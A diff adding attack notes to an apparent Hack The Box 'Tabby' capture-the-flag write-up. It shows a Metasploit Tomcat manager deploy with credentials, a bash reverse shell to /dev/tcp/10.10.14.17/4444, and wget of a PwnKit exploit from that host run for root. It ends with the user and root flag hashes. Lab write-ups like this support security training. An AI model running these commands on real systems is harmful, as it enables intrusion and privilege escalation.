@@ -121,4 +121,46 @@ OK - Listed applications for virtual host [localhost]
 /manager:running:0:/usr/share/tomcat9-admin/manager
 /docs:running:0:/usr/share/tomcat9-docs/docs
 
+[+]METASPLOIT[+]
+msf6 exploit(multi/http/tomcat_mgr_deploy) >
+HttpPassword  $3cureP4s5w0rd123!
+HttpUsername  tomcat
+PATH          /manager/text 
+RHOSTS        10.10.10.194
+RPORT         8080
+VHOST megahosting.htb
 
+meterpreter > pwd
+/var/lib/tomcat9
+
+[+]Revershell[+]
+meterpreter > shell
+bash -i >& /dev/tcp/10.10.14.17/4444 0>&1
+nc -lvnp 4444
+Treatment tty
+
+[+]Privilage Escalation[+]
+tomcat@tabby:/home$ id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+
+tomcat@tabby:/home$ find / -perm /4000 2>/dev/null
+/usr/bin/pkexec
+
+tomcat@tabby:/home$ find / -writable 2>/dev/null
+/tmp
+
+tomcat@tabby:/home$ wget http://10.10.14.17/PwnKit
+
+tomcat@tabby:/tmp$ chmod +x PwnKit 
+tomcat@tabby:/tmp$ ./PwnKit
+
+root@tabby:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),997(tomcat)
+root@tabby:/tmp# whoami
+root
+
+root@tabby:~# cat /home/ash/user.txt 
+d66ef33f4259f3affd76ac8f6d59df3f
+
+root@tabby:~# cat /root/root.txt 
+4d2009f6be4c91232fc68fffd4a22f18
